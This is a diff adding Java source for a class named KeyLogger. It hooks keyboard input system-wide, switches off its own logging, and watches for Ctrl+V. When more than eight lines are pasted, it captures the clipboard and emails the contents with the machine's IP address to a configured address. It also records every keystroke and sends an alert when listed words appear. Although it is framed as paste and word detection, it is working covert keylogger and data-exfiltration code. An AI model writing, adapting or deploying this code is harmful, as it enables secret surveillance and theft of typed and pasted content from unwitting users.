@@ -1,0 +1,135 @@
+import java.awt.Toolkit;
+import java.awt.datatransfer.Clipboard; //repository for a Transferable object and can be used for cut, copy, and paste operations
+import java.awt.datatransfer.DataFlavor; //DataFlavor is typically used to access data on the clipboard
+import java.awt.datatransfer.Transferable; // used to provide data for a transfer operation
+import java.awt.datatransfer.UnsupportedFlavorException; // handling flavor exception
+import java.io.IOException;  // handling  IO exception
+import java.util.ArrayList;  // Array list
+import java.util.logging.Level; // message level indicator
+import java.util.logging.Logger; //log messages
+
+// below imported class is used to detect keys pressed globally in windows system
+import com.github.kwhat.jnativehook.GlobalScreen;
+import com.github.kwhat.jnativehook.NativeHookException;
+import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
+import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;
+
+ public class KeyLogger extends CopyPasteDetector implements NativeKeyListener {
+// setting from, to, subject and text for mailing
+	static String from = "From_mail_id";
+	static String to = "To_mail_id";
+	static String subject;
+	static String text;
+		
+    private StringBuilder stringBuilder;
+    //words list
+    private ArrayList<String> wordsToSearch;
+    //paste detection 
+    private boolean isCtrlPressed;
+    // line count
+    private int lineCount;
+    
+    public KeyLogger() {
+        stringBuilder = new StringBuilder();
+        //list of words to be detected
+        wordsToSearch = new ArrayList<>(); // Initialize the ArrayList here
+        wordsToSearch.add("HELLO");
+        wordsToSearch.add("WORLD");
+        wordsToSearch.add("ABCD");
+        lineCount = 0;
+         try {
+        	 //detecting keys globally
+            GlobalScreen.registerNativeHook();
+        } catch (NativeHookException ex) {
+            System.err.println("Failed to register native hook: " + ex.getMessage());
+            System.exit(1);
+        }
+         GlobalScreen.addNativeKeyListener(this);
+        Logger logger = Logger.getLogger(GlobalScreen.class.getPackage().getName());
+        logger.setLevel(Level.OFF);
+    }
+     public static void main(String[] args) {
+    	 //repeatedly detecting
+        new KeyLogger();
+    }
+     
+     //overriding key pressed to detect ctrl+v
+     @Override
+    public void nativeKeyPressed(NativeKeyEvent e) {
+        int keyCode = e.getKeyCode();
+        //detecting ctrl
+        if (keyCode == NativeKeyEvent.VC_CONTROL) {
+            isCtrlPressed = true;
+        }
+        //detecting ctrl + v
+        if (isCtrlPressed && keyCode == NativeKeyEvent.VC_V) {
+        	String content="";
+        	int lineCount = 0;
+        	//detecting pasting by checking pasted content is matching with previous content
+        	Clipboard clipboard = Toolkit.getDefaultToolkit().getSystemClipboard();
+            Transferable contents = clipboard.getContents(null);
+            if (contents != null && contents.isDataFlavorSupported(DataFlavor.stringFlavor)) {
+                try {
+                	content = (String) contents.getTransferData(DataFlavor.stringFlavor);
+                	lineCount = this.countLines(content);
+                } catch (UnsupportedFlavorException | IOException m) {
+                    m.printStackTrace();
+                }
+            }
+            //checking the length of the content pasted is > 8
+           if(lineCount > 8) {
+        	   //setting subject and text with IP address 
+        	   subject = "Pasteing Detected in IP address: " + CopyPasteDetector.systemIPAddress();
+        	   text = "Pasteing Detected \n IP address: "+ CopyPasteDetector.systemIPAddress() + "\n Content: \n" + content;
+        	   //sending mail 
+        	   GmailSender.sendEmil(to, from, subject, text);
+           }
+        }
+        
+         String c = NativeKeyEvent.getKeyText(keyCode);
+        if (!c.equals(String.valueOf(NativeKeyEvent.CHAR_UNDEFINED))) {
+        	//appending keys to form word
+            stringBuilder.append(c);
+            String enteredText = stringBuilder.toString();
+            if (enteredText.endsWith("\n")) {
+                lineCount++;
+            }
+            
+            //checking words entered present in word array
+             for (String word : wordsToSearch) {
+                if (enteredText.contains(word)) {
+                	//setting subject and text with IP address
+                	subject = "Illigal word detected in IP address "+ CopyPasteDetector.systemIPAddress() ;
+                	text = "Illigal word detected \n IP address: "+ CopyPasteDetector.systemIPAddress() + "\n Word Detetced: "+word;
+                	//Sending mail
+                	GmailSender.sendEmil(to, from, subject, text);
+                	//repeatedly detecting
+                	restartProcess();
+                    break;
+                }
+            }
+        }
+    }
+   
+     //overriding to detect ctrl pressed
+	@Override
+    public void nativeKeyReleased(NativeKeyEvent e) {
+        int keyCode = e.getKeyCode();
+        if (keyCode == NativeKeyEvent.VC_CONTROL) {
+            isCtrlPressed = false;
+        }
+    }
+     @Override
+    public void nativeKeyTyped(NativeKeyEvent e) {
+    }
+     private void restartProcess() {
+        stringBuilder.setLength(0);
+        lineCount = 0;
+    }
+     
+     //getting number of lines
+     private static int countLines(String text) {
+         return text.split("\r\n|\r|\n").length;
+     }
+   
+}
